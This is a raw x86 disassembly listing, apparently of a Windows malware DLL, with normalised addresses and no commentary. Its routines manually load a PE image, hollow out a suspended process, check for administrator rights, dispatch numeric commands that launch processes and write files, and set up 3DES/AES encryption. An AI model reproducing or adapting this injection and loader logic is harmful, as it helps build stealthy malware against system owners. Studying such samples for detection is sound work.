push [ ebx + 0x8 ]
call sub_1000d6b9
pop ecx
pop ecx
mov [ ebx + 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ ebx + 0xc ]
mov [ eax + ecx * 4 ] esi
inc [ ebx + 0xc ]
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x10 ]
lea esi [ eax + ebp ]
mov [ esp + 0xc ] esi
jmp r-xdata
mov esi [ edi + 0x10 ]
add eax ebp
mov [ esp + 0xc ] eax
add esi ebp
jmp r-xdata
mov eax [ esp + 0xc ]
mov eax [ eax ]
test eax eax
jne r-xdata
jns r-xdata
jmp r-xdata
add eax ebp
add eax 0x2
and eax 0xffff
jmp r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
and [ esp + 0x10 ] 0x0
add [ esp + 0xc ] 0x4
add esi 0x4
push eax
push [ esp + 0x18 ]
call [ GetProcAddress@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
push 0x14
add edi 0x14
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
sub_1000ab2c
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
push edi
mov edi [ eax + 0x3c ]
add edi eax
cmp [ edi ] 0x4550
je r-xdata
xor eax eax
leave
retn
push ebx
push esi
mov esi [ VirtualAlloc@IAT ]
push 0x40
mov ebx 0x2000
push ebx
push [ edi + 0x50 ]
push [ edi + 0x34 ]
call esi
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
mov eax [ ebp - 0x4 ]
push 0x40
xor ecx ecx
push 0x1000
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x10 ] ecx
push [ edi + 0x50 ]
push eax
call esi
push 0x40
push 0x1000
push [ edi + 0x54 ]
push [ ebp - 0x4 ]
call esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x3c ]
add ecx [ edi + 0x54 ]
mov [ ebp - 0x8 ] eax
push ecx
push esi
push eax
call sub_10013da0
mov eax [ esi + 0x3c ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov ecx [ ebp - 0x4 ]
push ebx
push edi
mov [ ebx ] eax
push esi
mov [ eax + 0x34 ] ecx
call sub_1000a848
mov esi [ ebp - 0x4 ]
mov eax esi
add esp 0x18
sub eax [ edi + 0x34 ]
je r-xdata
push 0x40
push ebx
push [ edi + 0x50 ]
push eax
call esi
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
leave
retn
call sub_1000aa2b
test eax eax
je r-xdata
push eax
mov eax ebx
call sub_1000a9b2
pop ecx
xor eax eax
jmp r-xdata
mov esi ebx
call sub_1000acd6
push ebx
call sub_1000a8ef
mov eax [ ebx ]
mov eax [ eax + 0x28 ]
pop ecx
test eax eax
je r-xdata
pop esi
pop ebx
mov eax ebx
add eax esi
je r-xdata
push 0x0
xor edi edi
inc edi
push edi
push esi
call eax
test eax eax
jne r-xdata
mov [ ebx + 0x10 ] edi
sub_1000ac4b
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
add eax 0x78
xor edx edx
push ebx
push edi
mov [ ebp - 0x8 ] ecx
cmp [ eax + 0x4 ] edx
jne r-xdata
push esi
mov esi [ eax ]
add esi ecx
mov eax [ esi + 0x18 ]
cmp eax edx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x14 ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
add edi ecx
add ebx ecx
mov [ ebp - 0x4 ] edx
cmp eax edx
ja r-xdata
mov eax [ edi ]
add eax ecx
push eax
push [ ebp + 0x8 ]
call sub_1000c31a
pop ecx
pop ecx
test eax eax
je r-xdata
movzx eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x4
inc ebx
inc ebx
cmp eax [ esi + 0x18 ]
jb r-xdata
cmp eax [ esi + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + ecx ]
add eax ecx
jmp r-xdata
pop esi
sub_1000acd6
push ebx
xor ebx ebx
cmp esi ebx
je r-xdata
pop ebx
retn
cmp [ esi + 0x10 ] ebx
je r-xdata
cmp [ esi + 0x8 ] ebx
je r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
mov ecx [ ecx + 0x28 ]
push ebx
push ebx
push eax
add ecx eax
call ecx
mov [ esi + 0x10 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push edi
xor edi edi
cmp [ esi + 0xc ] ebx
jle r-xdata
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x8000
push ebx
push eax
call [ VirtualFree@IAT ]
push [ esi + 0x8 ]
call sub_1000c3e9
pop ecx
pop edi
mov eax [ esi + 0x8 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0xffffffff
je r-xdata
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
push [ eax ]
call [ FreeLibrary@IAT ]
sub_1000ad49
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000c176
leave
retn 0x4
mov ecx r--data
lea edx [ ebp - 0x84 ]
call sub_10007c70
lea eax [ ebp - 0x84 ]
push eax
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call eax
sub_1000ada0
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1000ab2c
mov esi eax
pop ecx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000c176
leave
retn 0x4
mov ecx r--data
lea edx [ ebp - 0x84 ]
call sub_10007c70
lea eax [ ebp - 0x84 ]
push eax
mov eax esi
call sub_1000ac4b
pop ecx
test eax eax
je r-xdata
call eax
sub_1000adf8
push ebp
mov ebp esp
sub esp 0x690
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x103
mov [ ebp - 0x62c ] eax
xor ebx ebx
lea eax [ ebp - 0x11b ]
push ebx
push eax
mov [ ebp - 0x11c ] 0x0
call sub_1000ebe0
add esp 0xc
mov ecx r--data
lea edx [ ebp - 0x11c ]
call sub_10007c70
lea eax [ ebp - 0x11c ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
mov ecx r--data
lea edx [ ebp - 0x11c ]
call sub_10007c70
mov esi [ GetProcAddress@IAT ]
lea eax [ ebp - 0x11c ]
push eax
push edi
call esi
mov ecx r--data
lea edx [ ebp - 0x11c ]
mov [ ebp - 0x608 ] eax
call sub_10007c70
lea eax [ ebp - 0x11c ]
push eax
push edi
call esi
mov ecx r--data
lea edx [ ebp - 0x11c ]
mov [ ebp - 0x634 ] eax
call sub_10007c70
lea eax [ ebp - 0x11c ]
push eax
push edi
call esi
mov ecx r--data
lea edx [ ebp - 0x11c ]
mov [ ebp - 0x604 ] eax
call sub_10007c70
lea eax [ ebp - 0x11c ]
push eax
push edi
call esi
mov [ ebp - 0x628 ] eax
cmp [ ebp - 0x608 ] ebx
je r-xdata
cmp [ ebp - 0x634 ] ebx
je r-xdata
cmp [ ebp - 0x604 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push 0x44
lea eax [ ebp - 0x68c ]
push ebx
push eax
call sub_1000ebe0
xor eax eax
lea edi [ ebp - 0x618 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x2cc
stosd [ edi ]
lea eax [ ebp - 0x5fc ]
push ebx
push eax
call sub_1000ebe0
add esp 0x18
push 0x104
lea eax [ ebp - 0x224 ]
push eax
push ebx
mov [ ebp - 0x68c ] 0x44
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
xor eax eax
mov cl [ ebp + eax - 0x224 ]
mov [ ebp + eax - 0x32c ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x32c ]
push eax
call [ PathRemoveFileSpecA@IAT ]
lea eax [ ebp - 0x618 ]
push eax
lea eax [ ebp - 0x68c ]
push eax
lea eax [ ebp - 0x32c ]
push eax
push ebx
push 0x4
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x224 ]
push eax
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x5fc ]
push eax
push [ ebp - 0x614 ]
mov [ ebp - 0x5fc ] 0x10007
call [ ebp - 0x608 ]
test eax eax
jne r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x63c ]
push eax
mov eax [ ebp - 0x558 ]
add eax 0x8
push eax
push [ ebp - 0x618 ]
call [ ebp - 0x604 ]
test eax eax
jne r-xdata
push 0x1
push [ ebp - 0x618 ]
call [ TerminateProcess@IAT ]
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
call [ GetLastError@IAT ]
push 0x1
push [ ebp - 0x618 ]
mov esi eax
call [ TerminateProcess@IAT ]
push esi
call [ SetLastError@IAT ]
jmp r-xdata
mov ecx r--data
lea edx [ ebp - 0x11c ]
call sub_10007c70
lea eax [ ebp - 0x11c ]
push eax
push edi
call esi
push [ ebp - 0x63c ]
mov [ rw-data ] eax
push [ ebp - 0x618 ]
call eax
test eax eax
je r-xdata
push edi
call [ FreeLibrary@IAT ]
mov eax [ ebp - 0x54c ]
mov edi [ VirtualAllocEx@IAT ]
push 0x40
mov ebx 0x3000
push ebx
push 0x20
push eax
push [ ebp - 0x618 ]
mov [ ebp - 0x630 ] eax
call edi
test eax eax
je r-xdata
push 0x1
push [ ebp - 0x618 ]
call [ TerminateProcess@IAT ]
push edi
call [ FreeLibrary@IAT ]
jmp r-xdata
mov eax [ ebp - 0x62c ]
mov esi [ eax + 0x3c ]
push 0x4
push ebx
add esi eax
push [ esi + 0x50 ]
push [ esi + 0x34 ]
push [ ebp - 0x618 ]
call edi
mov [ ebp - 0x604 ] eax
test eax eax
je r-xdata
push 0x0
push [ esi + 0x54 ]
push [ ebp - 0x62c ]
push eax
push [ ebp - 0x618 ]
call [ ebp - 0x628 ]
test eax eax
je r-xdata
and [ ebp - 0x608 ] 0x0
xor ecx ecx
lea eax [ esi + 0xf8 ]
cmp cx [ esi + 0x6 ]
jae r-xdata
mov eax [ ebp - 0x604 ]
push 0x0
mov [ ebp - 0x638 ] eax
push 0x4
lea eax [ ebp - 0x638 ]
push eax
mov eax [ ebp - 0x558 ]
add eax 0x8
push eax
push [ ebp - 0x618 ]
mov [ ebp - 0x5fc ] 0x10007
call [ ebp - 0x628 ]
test eax eax
je r-xdata
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x620 ] ecx
lea ecx [ eax + 0x24 ]
lea ebx [ eax + 0xc ]
lea edi [ eax + 0x10 ]
add eax 0x14
mov [ ebp - 0x61c ] ecx
mov [ ebp - 0x624 ] eax
mov ebx [ esi + 0x28 ]
add ebx [ ebp - 0x604 ]
lea eax [ ebp - 0x5fc ]
push eax
push [ ebp - 0x614 ]
call [ ebp - 0x634 ]
test eax eax
je r-xdata
push 0x28
pop eax
add [ ebp - 0x624 ] eax
add [ ebp - 0x61c ] eax
add [ ebp - 0x620 ] eax
add edi eax
add ebx eax
movzx eax [ esi + 0x6 ]
inc [ ebp - 0x608 ]
cmp [ ebp - 0x608 ] eax
jl r-xdata
test eax eax
je r-xdata
sub ebx [ ebp - 0x630 ]
mov esi r--data
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
push 0x0
movsd [ edi ] [ esi ]
push 0xb
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x630 ]
movsw [ edi ] [ esi ]
push [ ebp - 0x618 ]
movsb [ edi ] [ esi ]
sub ebx 0x5
mov [ ebp - 0x13 ] ebx
call [ ebp - 0x628 ]
push [ ebp - 0x614 ]
call [ ResumeThread@IAT ]
mov eax [ ebp - 0x618 ]
jmp r-xdata
mov eax [ ebp - 0x624 ]
mov eax [ eax ]
add eax [ ebp - 0x62c ]
and [ ebp - 0x600 ] 0x0
push 0x0
push [ edi ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x604 ]
push eax
push [ ebp - 0x618 ]
call [ ebp - 0x628 ]
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp - 0x61c ]
mov eax [ eax ]
test eax 0x40000000
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
test eax eax
jns r-xdata
mov [ ebp - 0x600 ] 0x2
test eax 0x20000000
je r-xdata
mov [ ebp - 0x600 ] 0x4
lea eax [ ebp - 0x640 ]
push eax
push [ ebp - 0x600 ]
mov eax [ ebp - 0x620 ]
push [ eax ]
mov eax [ ebx ]
add eax [ ebp - 0x604 ]
push eax
push [ ebp - 0x618 ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x600 ] 0x10
test [ ebp - 0x600 ] 0x4
je r-xdata
test [ ebp - 0x600 ] 0x2
je r-xdata
mov [ ebp - 0x600 ] 0x40
jmp r-xdata
mov [ ebp - 0x600 ] 0x20
sub_1000b2f3
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
xor ebx ebx
push 0x103
mov [ ebp - 0x250 ] eax
lea eax [ ebp - 0x193 ]
mov esi ecx
push ebx
push eax
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x194 ] bl
call sub_1000ebe0
add esp 0xc
push 0x7f
lea eax [ ebp - 0x8b ]
push ebx
push eax
mov [ ebp - 0x24c ] ebx
mov [ ebp - 0x8c ] bl
call sub_1000ebe0
add esp 0xc
cmp esi ebx
je r-xdata
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0xa8
jb r-xdata
push 0x2a
pop ecx
lea edi [ ebp - 0x23c ]
[ edi ] [ esi ]
mov eax [ ebp - 0x238 ]
lea ecx [ eax + 0xa8 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
push eax
call sub_1000cef2
pop ecx
mov [ ebp - 0x240 ] eax
cmp eax ebx
je r-xdata
mov esi r--data
lea edi [ ebp - 0x8c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x8c ]
push eax
push [ ebp - 0x238 ]
mov eax [ ebp - 0x244 ]
push [ ebp - 0x240 ]
movsd [ edi ] [ esi ]
add eax 0xa8
movsd [ edi ] [ esi ]
call sub_10007d20
add esp 0xc
cmp [ ebp - 0x23b ] 0x1
jne r-xdata
cmp [ ebp - 0x23b ] 0x2
jne r-xdata
mov esi [ ebp - 0x238 ]
push esi
call sub_1000cef2
pop ecx
mov [ ebp - 0x248 ] eax
cmp eax ebx
je r-xdata
push [ ebp - 0x240 ]
mov eax [ ebp - 0x238 ]
cmp eax 0x800
jbe r-xdata
push esi
push [ ebp - 0x240 ]
push eax
call sub_10013da0
add esp 0xc
jmp r-xdata
lea eax [ eax * 4 + 0x1000 ]
shl eax 0x2
jmp r-xdata
push [ ebp - 0x240 ]
call sub_1000c3e9
cmp [ ebp - 0x23c ] 0x22
pop ecx
je r-xdata
push [ ebp - 0x238 ]
lea esi [ ebp - 0x244 ]
push [ ebp - 0x240 ]
push edi
call sub_100081e0
add esp 0xc
test eax eax
jge r-xdata
push eax
mov [ ebp - 0x244 ] eax
call sub_1000cef2
mov edi eax
pop ecx
mov [ ebp - 0x248 ] edi
cmp edi ebx
je r-xdata
mov esi [ Sleep@IAT ]
mov edi 0x3e8
cmp [ ebp - 0x23c ] 0x12
je r-xdata
mov eax [ ebp - 0x244 ]
mov [ ebp - 0x238 ] eax
push [ ebp - 0x240 ]
call sub_1000c3e9
pop ecx
push edi
jmp r-xdata
cmp [ ebp - 0x23c ] 0x21
jne r-xdata
push 0x44
pop edi
push edi
lea eax [ ebp - 0x54 ]
push ebx
push eax
call sub_1000ebe0
xor eax eax
mov [ ebp - 0x54 ] edi
lea edi [ ebp - 0x260 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
add esp 0xc
stosd [ edi ]
xor eax eax
mov [ ebp - 0x24 ] ax
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x194 ]
push eax
mov [ ebp - 0x28 ] 0x1
call [ CreateProcessA@IAT ]
push 0x3e8
call esi
mov edi 0x3e8
call sub_1000b920
test eax eax
je r-xdata
call sub_1000c3e9
pop ecx
cmp [ ebp - 0x23c ] 0x12
jne r-xdata
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
mov esi [ ebp + 0xc ]
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x1 ]
cmp [ ebp - 0x23c ] 0x1
jne r-xdata
push [ ebp - 0x248 ]
call sub_1000adf8
pop ecx
push edi
call esi
lea ecx [ ebp - 0x24c ]
push ecx
push ebx
lea ecx [ ebp - 0x194 ]
push ecx
push sub_1000ad49
push ebx
push ebx
call eax
push edi
call esi
push 0x104
lea eax [ ebp - 0x194 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x194 ]
lea edx [ eax + 0x1 ]
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
cmp [ ebp - 0x23c ] 0x22
jne r-xdata
push [ ebp - 0x250 ]
push [ ebp - 0x238 ]
push [ ebp - 0x248 ]
call sub_1000a3b5
add esp 0xc
push edi
call esi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
dec eax
movzx eax ax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
xor eax eax
push [ ebp - 0x248 ]
call sub_1000c3e9
pop ecx
xor eax eax
jmp r-xdata
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
cmp ax bx
jg r-xdata
lea edx [ ebp - 0x194 ]
mov eax esi
sub edx esi
mov cl [ ebp + eax - 0x214 ]
mov [ ebp + eax - 0x194 ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
lea ecx [ ebp - 0x24c ]
push ecx
push ebx
push [ ebp - 0x248 ]
push sub_1000ada0
push ebx
push ebx
call eax
push edi
call esi
movsx ecx ax
cmp [ ebp + ecx - 0x194 ] 0x5c
je r-xdata
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
jmp r-xdata
lea edi [ ebp - 0x194 ]
dec edi
cwde
mov [ ebp + eax - 0x194 ] bl
dec eax
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x234 ]
movsw [ edi ] [ esi ]
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x194 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
push ebx
mov esi edx
[ edi ] [ esi ]
push 0x80
push 0x2
push ebx
push ebx
mov ecx eax
push 0x40000000
lea eax [ ebp - 0x194 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0x238 ]
push eax
push [ ebp - 0x238 ]
push [ ebp - 0x248 ]
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
mov esi [ Sleep@IAT ]
mov edi 0x3e8
push edi
call esi
jmp r-xdata
push [ ebp - 0x248 ]
jmp r-xdata
cmp [ ebp - 0x23c ] 0x11
jne r-xdata
sub_1000b760
sub esp 0x404
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x400 ] eax
push ebx
push edi
xor ebx ebx
push 0x3ff
lea eax [ esp + 0xd ]
push ebx
push eax
mov [ esp + 0x14 ] bl
call sub_1000ebe0
mov edx [ esp + 0x41c ]
lea ecx [ esp + 0x420 ]
push ecx
push edx
lea eax [ esp + 0x1c ]
push eax
call sub_1000dc1c
add esp 0x18
xor edi edi
cmp [ esp + 0x8 ] bl
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx [ esp + 0x400 ]
xor ecx esp
call sub_1000c176
add esp 0x404
retn
mov eax [ esi + 0x404 ]
movzx ecx [ eax + 0x2 ]
mov dl [ esp + edi + 0x8 ]
mov [ ecx + eax + 0x4 ] dl
mov eax [ esi + 0x404 ]
inc [ eax + 0x2 ]
mov eax [ esi + 0x404 ]
mov ecx 0x400
inc edi
cmp [ eax + 0x2 ] cx
jne r-xdata
cmp [ esp + edi + 0x8 ] bl
jne r-xdata
push 0x40c
call sub_1000cef2
add esp 0x4
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x408 ]
pop edi
pop ebx
xor ecx esp
or eax 0xffffffff
call sub_1000c176
add esp 0x404
retn
xor edx edx
mov [ eax ] dx
xor ecx ecx
mov [ eax + 0x2 ] cx
mov [ eax + 0x404 ] ebx
mov [ eax + 0x408 ] ebx
mov edx [ esi + 0x404 ]
mov [ edx + 0x408 ] eax
mov [ esi + 0x404 ] eax
sub_1000b860
push ebp
mov ebp [ esp + 0xc ]
push esi
xor esi esi
test ebp ebp
jbe r-xdata
mov eax esi
pop esi
pop ebp
retn
mov eax [ esp + 0xc ]
mov eax [ eax ]
push edi
cmp esi ebp
jb r-xdata
mov edi [ eax + 0x408 ]
mov ecx [ eax + 0x404 ]
push eax
mov [ edi + 0x404 ] ecx
call sub_1000c3e9
add esp 0x4
mov eax edi
movzx ecx [ eax ]
mov dl [ ecx + eax + 0x4 ]
mov [ esi + ebx ] dl
inc [ eax ]
movzx ecx [ eax ]
mov edx 0x400
inc esi
cmp cx dx
jb r-xdata
mov edx [ esp + 0x10 ]
mov [ edx ] eax
pop edi
sub_1000b8c0
sub esp 0x8
push 0x0
call sub_1000cd92
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x4 ]
push eax
mov [ esp + 0xc ] edx
call sub_1000e583
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push ecx
mov ecx [ eax + 0x8 ]
push edx
mov edx [ eax + 0xc ]
push ecx
mov ecx [ eax + 0x10 ]
push edx
mov edx [ eax + 0x14 ]
inc ecx
push ecx
add edx 0x76c
push edx
push r--data
push rw-data
call [ wsprintfA@IAT ]
mov eax rw-data
add esp 0x30
retn
sub_1000b920
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebx
xor ebx ebx
lea eax [ esp + 0x8 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] 0x5
call [ AllocateAndInitializeSid@IAT ]
mov [ esp + 0x4 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x14 ]
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x14
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_1000b9c0
sub esp 0x8
push esi
push 0x2c
mov [ esp + 0xc ] 0x0
call sub_1000cef2
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor eax eax
pop esi
add esp 0x8
retn
push 0x2c
push 0x0
push esi
call sub_1000ebe0
lea eax [ esp + 0x10 ]
push eax
call sub_1000c0b0
add esp 0x10
test eax eax
jl r-xdata
push esi
call sub_1000c3e9
add esp 0x4
push r--data
call sub_1000c020
push r--data
mov [ esi + 0x28 ] eax
call sub_1000c020
push r--data
mov [ esi + 0x20 ] eax
call sub_1000c020
push r--data
mov [ esi + 0x1c ] eax
call sub_1000c020
add esp 0x10
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x24 ] eax
je r-xdata
cmp [ esi + 0x20 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
lea edx [ esp + 0x8 ]
push edx
mov edx [ esp + 0x18 ]
push 0x0
push eax
mov eax [ esp + 0x1c ]
push edx
mov edx [ rw-data ]
push eax
push edx
call ecx
test eax eax
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push edi
lea edi [ esi + 0x4 ]
push edi
push 0x40
push edx
mov edx [ rw-data ]
push eax
mov eax [ esi + 0x1c ]
push ecx
push edx
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ esi + 0x20 ]
push eax
call ecx
mov edx [ esp + 0x24 ]
mov eax [ edi ]
mov ecx [ esi + 0x24 ]
push 0x0
push edx
push 0x1
push eax
call ecx
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esi + 0x20 ]
push ecx
call edx
mov eax [ esp + 0xc ]
mov ecx [ esi + 0x20 ]
push eax
call ecx
push esi
call sub_1000c3e9
add esp 0x4
pop edi
xor eax eax
pop esi
add esp 0x8
retn
pop edi
mov eax esi
pop esi
add esp 0x8
retn
mov edx [ esp + 0x8 ]
mov eax [ esi + 0x20 ]
push edx
call eax
mov ecx [ esp + 0xc ]
mov edx [ esi + 0x20 ]
push ecx
call edx
push esi
call sub_1000c3e9
add esp 0x4
pop edi
xor eax eax
pop esi
add esp 0x8
retn
sub_1000bb20
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x20 ]
push eax
call ecx
push esi
call sub_1000c3e9
add esp 0x4
sub_1000bb40
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
mov ecx [ eax + 0x4 ]
push 0x0
push edx
mov edx [ eax + 0x28 ]
push 0x0
push ecx
call edx
neg eax
sbb eax eax
neg eax
dec eax
retn
sub_1000bb70
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push esi
push edi
mov edi [ esp + 0x118 ]
push r--data
call sub_1000c020
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
or eax 0xffffffff
pop esi
mov ecx [ esp + 0x104 ]
xor ecx esp
call sub_1000c176
add esp 0x108
retn
mov eax [ esp + 0x114 ]
cmp eax 0x6603
jne r-xdata
cmp eax 0x6610
jne r-xdata
push 0x10
push 0x1
push r--data
push edi
push rw-data
call esi
push 0x0
push 0x1
push r--data
push edi
push rw-data
call esi
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push r--data
push eax
call sub_1000bf50
add esp 0x8
push 0x10
push 0x18
lea ecx [ esp + 0x10 ]
push ecx
push edi
push rw-data
call esi
push 0x0
push 0x18
lea edx [ esp + 0x10 ]
push edx
push edi
push rw-data
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0x10c ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x108
retn
push 0x8
push 0x1
push r--data
push 0x8
push 0x18
lea eax [ esp + 0x10 ]
push eax
push edi
push rw-data
call esi
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push r--data
push ecx
call sub_1000bf50
add esp 0x8
push 0x10
push 0x18
lea edx [ esp + 0x10 ]
push edx
push edi
push rw-data
call esi
push 0x0
push 0x18
lea eax [ esp + 0x10 ]
push eax
push edi
push rw-data
call esi
test eax eax
jne r-xdata
push 0x8
push 0x18
lea ecx [ esp + 0x10 ]
push ecx
jmp r-xdata
push edi
push rw-data
call esi
sub_1000bcc0
mov eax [ esp + 0x4 ]
cmp eax 0x6603
jne r-xdata
cmp eax 0x6610
jne r-xdata
push r--data
call sub_1000c020
add esp 0x4
test eax eax
je r-xdata
or eax 0xffffffff
retn
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ esp + 0x8 ]
push 0x10
push 0x1
push r--data
push ecx
push rw-data
call eax
test eax eax
jne r-xdata
xor eax eax
retn
push r--data
call sub_1000c020
